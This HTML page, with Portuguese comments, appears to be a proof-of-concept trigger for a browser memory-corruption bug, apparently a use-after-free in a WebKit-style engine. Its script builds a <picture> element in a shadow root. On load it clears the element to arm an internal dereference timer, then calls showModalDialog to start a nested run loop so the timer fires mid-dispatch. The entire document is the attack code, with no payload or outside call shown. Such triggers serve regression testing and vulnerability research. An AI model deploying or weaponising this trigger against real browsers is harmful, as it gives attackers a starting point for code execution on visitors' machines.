<!DOCTYPE html>
<html>
<body>
<div id="host" style="display:none"></div>
<script>
try {
    var host = document.getElementById('host');
    var sr = host.attachShadow({mode: 'open'});
    sr.innerHTML = '<picture id="pic"><source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><img></picture>';
    var pic = sr.getElementById('pic');

    pic.addEventListener('load', function listener() {
        pic.removeEventListener('load', listener, true);
        
        // Remove o <img> do <picture> para armar o m_derefElementTimer
        pic.textContent = '';

        // Dispara o nested run loop para disparar o timer enquanto o dispatch está na pilha
        if (typeof showModalDialog === 'function') {
            showModalDialog('modal.html');
        } else {
            console.log("showModalDialog indisponível nesta versão.");
        }
    }, true);
} catch (e) {
    document.body.innerText = "Erro: " + e.message;
}
</script>
</body>
</html>
